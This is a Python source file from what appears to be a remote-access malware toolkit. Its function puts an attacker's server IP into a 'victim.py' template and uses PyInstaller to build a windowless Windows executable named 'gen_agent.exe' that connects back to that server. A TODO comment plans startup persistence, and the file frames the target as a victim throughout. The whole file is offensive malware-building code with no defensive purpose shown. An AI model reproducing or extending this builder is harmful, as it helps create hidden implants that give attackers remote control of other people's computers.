from sys import platform
import os
import shutil

import PyInstaller.__main__

# pass in server ip and executable that connects
# to server will be generated
def generate_agent(serv_ip):
    print(platform)
    with open('victim.py', 'r') as a:
        agent = a.read()

    agent = agent.replace('REPLACE_IP', serv_ip)

    with open('new_payload.py', 'w') as f:
        new_file = f.write(agent)
    
    a.close()
    f.close()


    if platform == 'linux':
        #TODO use wine to generate windows executable from linux
        pass
    elif platform == 'win32':
        PyInstaller.__main__.run([
            'new_payload.py', 
            '--noconsole',
            '-F',
            '--distpath',
            '../agents',
            '-n',
            'gen_agent.exe'
        ])

    # cleans up unneeded files
    os.remove('gen_agent.exe.spec')
    shutil.rmtree('build')

    # TODO make executable execute on start for persistence

